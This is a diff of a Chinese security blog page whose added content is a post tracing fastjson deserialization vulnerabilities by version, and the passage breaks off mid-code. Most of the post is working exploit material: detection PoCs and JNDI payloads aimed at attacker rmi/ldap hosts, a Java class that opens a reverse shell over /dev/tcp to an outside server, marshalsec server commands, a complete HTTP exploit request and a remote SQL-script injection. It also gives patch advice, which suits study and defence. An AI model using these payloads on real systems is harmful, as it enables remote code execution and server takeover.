@@ -6,17 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://dayun.shystartree.online">
-  <title>Tag: 随记 | qingyu&#39;s blog</title>
+  <title>fastjson反序列化漏洞史 | qingyu&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="生活或许对你不尽人意，但是又如何呢，你活得开心就够了！">
-<meta property="og:type" content="website">
-<meta property="og:title" content="qingyu&#39;s blog">
-<meta property="og:url" content="http://dayun.shystartree.online/tags/随记/index.html">
+  <meta name="keywords" content="安全,fastjson,反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化漏洞史">
+<meta property="og:url" content="http://dayun.shystartree.online/2020/10/22/fastjson反序列化漏洞史/index.html">
 <meta property="og:site_name" content="qingyu&#39;s blog">
-<meta property="og:description" content="生活或许对你不尽人意，但是又如何呢，你活得开心就够了！">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201221175832623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoeXN0YXJ0cmVl,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201221175943816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoeXN0YXJ0cmVl,size_16,color_FFFFFF,t_70">
+<meta property="og:updated_time" content="2020-12-21T10:14:57.665Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="qingyu&#39;s blog">
-<meta name="twitter:description" content="生活或许对你不尽人意，但是又如何呢，你活得开心就够了！">
+<meta name="twitter:title" content="fastjson反序列化漏洞史">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201221175832623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoeXN0YXJ0cmVl,size_16,color_FFFFFF,t_70">
   
     <link rel="alternative" href="/atom.xml" title="qingyu&#39;s blog" type="application/atom+xml">
   
@@ -158,61 +160,370 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-fastjson反序列化漏洞史" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2018/01/12/八尾猫/" class="archive-article-date">
-  	<time datetime="2018-01-12T07:44:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-12</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/12/八尾猫/">八尾猫</a>
+    <h1 class="article-title" itemprop="name">
+      fastjson反序列化漏洞史
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+
+
+        
+        
+        <!-- 不蒜子统计 -->
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2020/10/22/fastjson反序列化漏洞史/" class="archive-article-date">
+  	<time datetime="2020-10-21T19:14:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-22</time>
+</a>
+        
+      </header>
+    
+    <!-- 目录内容 -->
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+  <div id="toc-article" class="toc-article">
+      <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+    <strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、fastjson简介"><span class="toc-number">1.</span> <span class="toc-text">1、fastjson简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、fastjson反序列化漏洞版本线"><span class="toc-number">2.</span> <span class="toc-text">2、fastjson反序列化漏洞版本线</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-fastjson-v0-1-2-24"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 fastjson v0 - 1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#检测poc"><span class="toc-number">2.1.1.</span> <span class="toc-text">检测poc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE"><span class="toc-number">2.2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#修复方法"><span class="toc-number">2.2.1.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-fastjson-1-2-25-1-2-47"><span class="toc-number">2.3.</span> <span class="toc-text">2.2 fastjson 1.2.25 - 1.2.47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#检测poc-1"><span class="toc-number">2.4.</span> <span class="toc-text">检测poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE-1"><span class="toc-number">2.5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#修复方法-1"><span class="toc-number">2.5.1.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-fastjson-1-2-48-1-2-61"><span class="toc-number">2.6.</span> <span class="toc-text">2.3 fastjson 1.2.48 - 1.2.61</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#检测poc-2"><span class="toc-number">2.6.1.</span> <span class="toc-text">检测poc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RCE-2"><span class="toc-number">2.6.2.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#修复方法-2"><span class="toc-number">2.6.3.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-fastjson-1-2-62-1-2-68"><span class="toc-number">2.7.</span> <span class="toc-text">2.4 fastjson 1.2.62 - 1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#检测poc-3"><span class="toc-number">2.7.1.</span> <span class="toc-text">检测poc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#修复方法-3"><span class="toc-number">2.7.2.</span> <span class="toc-text">修复方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、fastjson渗透测试技巧"><span class="toc-number">3.</span> <span class="toc-text">3、fastjson渗透测试技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-获取-fastjson-精确版本号的方法（-lt-fastjson-1-2-73）"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 获取 fastjson 精确版本号的方法（&lt;= fastjson 1.2.73）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-fastjson判断特征"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 fastjson判断特征</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+         </div>
+   <script type="text/javascript">
+  function showToc(){
+    var toc_article = document.getElementById("toc-article");
+    var show_toc_btn = document.getElementById("show-toc-btn");
+    toc_article.setAttribute("style","display:block");
+    show_toc_btn.setAttribute("style","display:none");
+    };
+  function showBtn(){
+    var toc_article = document.getElementById("toc-article");
+    var show_toc_btn = document.getElementById("show-toc-btn");
+    toc_article.setAttribute("style","display:none");
+    show_toc_btn.setAttribute("style","display:block");
+    };
+   </script>
+      
+<!-- 目录内容结束 -->
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="https://img-blog.csdnimg.cn/20201221175832623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoeXN0YXJ0cmVl,size_16,color_FFFFFF,t_70" alt=""></p>
+<a id="more"></a>
+<h3 id="1、fastjson简介"><a href="#1、fastjson简介" class="headerlink" title="1、fastjson简介"></a>1、fastjson简介</h3><p>Fastjson是一个Java语言编写的高性能功能完善的JSON库。它采用一种“假定有序快速匹配”的算法，把JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库。Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景，有如下特点：<br>1、高性能<br>fastjson采用独创的算法，将parse的速度提升到极致，超过所有json库，包括曾经号称最快的jackson。并且还超越了google的二进制协议protocol buf。<br>2、支持标准<br>Fastjson完全支持<a href="http://json.org的标准，也是官方网站收录的参考实现之一。" target="_blank" rel="noopener">http://json.org的标准，也是官方网站收录的参考实现之一。</a><br>3、功能强大<br>支持各种JDK类型。包括基本类型、JavaBean、Collection、Map、Enum、泛型等 &amp;&amp; 支持循环引用<br>4、无依赖<br>不需要例外额外的jar，能够直接跑在JDK上。<br>5、支持范围广<br>支持JDK 5、JDK 6、Android、阿里云手机等环境。<br>6、开源<br>Apache License 2.0 &amp;&amp; 代码托管在github.org上，项目地址是 <a href="https://github.com/AlibabaTech/fastjson" target="_blank" rel="noopener">https://github.com/AlibabaTech/fastjson</a><br>7、测试充分<br>fastjson有超过1500个testcase，每次构建都会跑一遍，丰富的测试场景保证了功能稳定。</p>
+<h3 id="2、fastjson反序列化漏洞版本线"><a href="#2、fastjson反序列化漏洞版本线" class="headerlink" title="2、fastjson反序列化漏洞版本线"></a>2、fastjson反序列化漏洞版本线</h3><h4 id="2-1-fastjson-v0-1-2-24"><a href="#2-1-fastjson-v0-1-2-24" class="headerlink" title="2.1 fastjson v0 - 1.2.24"></a>2.1 fastjson v0 - 1.2.24</h4><p>在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞(CVE-2017-18349)。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。<br>fastjson1.2.24之前的反序列化漏洞是因为fastjson完全没有对需要加载的类进行限制，导致非法加载产生反序列化漏洞。在之后的版本更新中fastjson在ParserConfig类中添加了checkAutoType方法对加载类进行黑名单限制。<br>可以利用的主流方式有两种：</p>
+<ol>
+<li>JNDI注入利用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中的_bytecodes属性进行整个恶意类的反序列化。优点是不需要攻击端开启rmi或者ldap服务比较方便利用，缺点是fastjosn默认不会反序列私有属性，需要在反序列化时设置Feature.SupportNonPublicField这种方式才可以利用成功。</li>
+<li>利用rmi或者ldap让服务器远程调用恶意类进行利用。<br>由于第一种方式受限制较多，很多情况下不会设置Feature.SupportNonPublicField，所以第二种方式较为常见。</li>
+</ol>
+<h5 id="检测poc"><a href="#检测poc" class="headerlink" title="检测poc"></a>检测poc</h5><p>检测poc1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//class文件做base64加密：</span><br><span class="line">import base64</span><br><span class="line">fin = open(r&quot;Poc.class&quot;, &quot;rb&quot;)</span><br><span class="line">fout = open(r&quot;en.txt&quot;, &quot;w&quot;)</span><br><span class="line">s = base64.encodestring(fin.read()).replace(&quot;\n&quot;, &quot;&quot;)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure>
+<p>生成的 base64 文本填在json 的_bytecodes字段中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">    &quot;_bytecodes&quot;: [</span><br><span class="line">&quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;_name&quot;: &quot;aaa&quot;,</span><br><span class="line">    &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class="line">    &quot;_outputProperties&quot;: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><em>触发原因简析：TemplatesImpl对象恢复-&gt;JavaBeanDeserializer.deserialze-&gt;FieldDeserializer.setValue-&gt;TemplatesImpl.getOutputProperties-&gt;TemplatesImpl.newTransformer-&gt;TemplatesImpl.getTransletInstance-&gt;通过defineTransletClasses，newInstance触发我们自己构造的class的静态代码块</em></p>
+<p>检测poc2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://fastjson.xxx.ceye.io&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+<p><em>触发原因简析：JdbcRowSetImpl对象恢复-&gt;setDataSourceName方法调用-&gt;setAutocommit方法调用-&gt;context.lookup(datasourceName)调用</em></p>
+<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>影响范围为1.2.22 &lt;= fastjson &lt;= 1.2.24</p>
+<p>1、首先编译并上传命令执行代码到VPS，<a href="http://x.x.x.x:port/Shell.class：" target="_blank" rel="noopener">http://x.x.x.x:port/Shell.class：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// javac Shell.java</span><br><span class="line"></span><br><span class="line">import java.lang.Runtime;</span><br><span class="line"></span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class Shell &#123;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">            String[] commands = &#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/vps.com/12345 0&gt;&amp;1&quot;&#125;;</span><br><span class="line"></span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line"></span><br><span class="line">            pc.waitFor();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>2、然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI或ldap服务器，监听9999端口，并指定加载远程类Shell.class：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://vps.com/#Shell&quot; 9999</span><br></pre></td></tr></table></figure>
+<p>3、向受害服务器发送Payload，带上RMI的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://vps.com:9999/Shell&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>4、在vps上使用nc -lvv 12345 监听，成功接收到shell</p>
+<blockquote>
+<p>ldap利用方法见<a href="https://www.cnblogs.com/hac425/p/9800288.html" target="_blank" rel="noopener">此处的方案4</a></p>
+</blockquote>
+<h5 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h5><p><a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315" target="_blank" rel="noopener">请升级到1.2.28/1.2.29/1.2.30/1.2.31或者更新版本</a></p>
+<h4 id="2-2-fastjson-1-2-25-1-2-47"><a href="#2-2-fastjson-1-2-25-1-2-47" class="headerlink" title="2.2 fastjson 1.2.25 - 1.2.47"></a>2.2 fastjson 1.2.25 - 1.2.47</h4><p>1.2.24之前没有autotype的限制，从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。漏洞大概是这样形成的，首先，Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。</p>
+<h4 id="检测poc-1"><a href="#检测poc-1" class="headerlink" title="检测poc"></a>检测poc</h4><p>1 适用于1.2.25-1.2.30、1.2.41(需开启autotype)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:“Lcom.sun.rowset.JdbcRowSetImpl;”,“dataSourceName”:“rmi://xxx.com/Exploit”, “autoCommit”:true&#125;</span><br></pre></td></tr></table></figure>
+<p>2 适用于1.2.25-1.2.30、1.2.41、1.2.42(需开启autotype)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:“LLcom.sun.rowset.JdbcRowSetImpl;;”,“dataSourceName”:“rmi://xxx.com/Exploit”, “autoCommit”:true&#125;</span><br></pre></td></tr></table></figure>
+<p>3 适用于1.2.41、1.2.42、1.2.43(需开启autotype)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;“dataSourceName”:“rmi://xxx.com/Exploit”,“autoCommit”:true]&#125;</span><br></pre></td></tr></table></figure>
+<p>4 适用于1.2.45(需开启autotype)（fastjson&gt;=1.2.25默认为false）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:“org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”,“properties”:&#123;“data_source”:“rmi://xxx.com/Exploit”&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>5 适用于&lt;=1.2.47(不需开启autotype)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;“a”:&#123;&quot;@type&quot;:“java.lang.Class”,“val”:“com.sun.rowset.JdbcRowSetImpl”&#125;,“b”:&#123;&quot;@type&quot;:“com.sun.rowset.JdbcRowSetImpl”,“dataSourceName”:“rmi://xxx/Exploit”,“autoCommit”:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;“a”:&#123;&quot;@type&quot;:“java.lang.Class”,“val”:“org.apache.commons.configuration.JNDIConfiguration”&#125;,“b”:&#123;&quot;@type&quot;:“org.apache.commons.configuration.JNDIConfiguration”,“prefix”:“rmi://xxx/Exploit”&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;“a”:&#123;&quot;@type&quot;:“java.lang.Class”,“val”:“oracle.jdbc.connector.OracleManagedConnectionFactory”&#125;,“b”:&#123;&quot;@type&quot;:“oracle.jdbc.connector.OracleManagedConnectionFactory”,“xaDataSourceName”:“rmi://xxx/Exploit”&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE"></a>RCE</h4><p>1、外网服务器8080端口开启Http服务放置Exploit.class</p>
+<p>Exploit.java示例代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>2、外网服务器执行以下命令监听一个RMIServer：</p>
+<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://[ip]:8080/#Exploit</code><br>3、目标站点发送payload。</p>
+<h5 id="修复方法-1"><a href="#修复方法-1" class="headerlink" title="修复方法"></a>修复方法</h5><p>确认 fastjson 版本至少升级到 1.2.58，同时确认自身服务的 Java 环境版本，低于 8u121 7u13 6u141 的用户也请及时升级环境版本，以防受到其他严重漏洞影响。</p>
+<h4 id="2-3-fastjson-1-2-48-1-2-61"><a href="#2-3-fastjson-1-2-48-1-2-61" class="headerlink" title="2.3 fastjson 1.2.48 - 1.2.61"></a>2.3 fastjson 1.2.48 - 1.2.61</h4><p>2019年9月19日fastjson官方发布了1.2.61新版本，增加了autoType安全黑名单。但是新版本刚发布不到一周时间，其黑名单就被bypass，成功绕过了黑名单防护，可以利用fastjson反序列化特性造成RCE。从漏洞公布的poc可知这次gadget是commons-configuration组件，该组件是java应用程序的配置管理类，用于协助管理各种格式的配置文件。</p>
+<h5 id="检测poc-2"><a href="#检测poc-2" class="headerlink" title="检测poc"></a>检测poc</h5><p>1 适用于&lt;=1.2.50(不需开启AutoType)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;oracle.jdbc.rowset.OracleJDBCRowSet&quot;,&quot;dataSourceName&quot;:&quot;ldap://w3nkdw.dnslog.cn/Exploit&quot;,&quot;command&quot;:&quot;a&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>2 适用于&lt;=1.2.58(特定库logback-core.jar、h2.jar和需开启AutoType和jdk1.6 &lt; 6u132；jdk1.7 &lt; 7u122；jdk1.8 &lt; 8u113)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM&apos;http://[IP]/inject.sql&apos;&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>3 适用于&lt;=1.2.60(特定库commons-configuration-1.4.jar和需开启AutoType)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:“org.apache.commons.configuration.JNDIConfiguration”,“prefix”:“rmi://x.x.x.x:1389/Exploit”&#125;</span><br></pre></td></tr></table></figure>
+<p>4 适用于&lt;=1.2.60(特定库ojdbc14-10.2.0.2.0.jar和需开启AutoType)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:“oracle.jdbc.connector.OracleManagedConnectionFactory”,“xaDataSourceName”:“rmi://x.x.x.x:1111/Exploit”&#125;</span><br></pre></td></tr></table></figure>
+<p>5 适用于&lt;=1.2.61</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="RCE-2"><a href="#RCE-2" class="headerlink" title="RCE"></a>RCE</h5><p>1、外网服务器8081端口开启Http服务放置Exploit.class<br>Exploit.class示例代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line"></span><br><span class="line">&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Exploit&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&#123;</span><br><span class="line">    &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&#123;</span><br><span class="line">        Runtime.getRuntime().exec(&lt;span 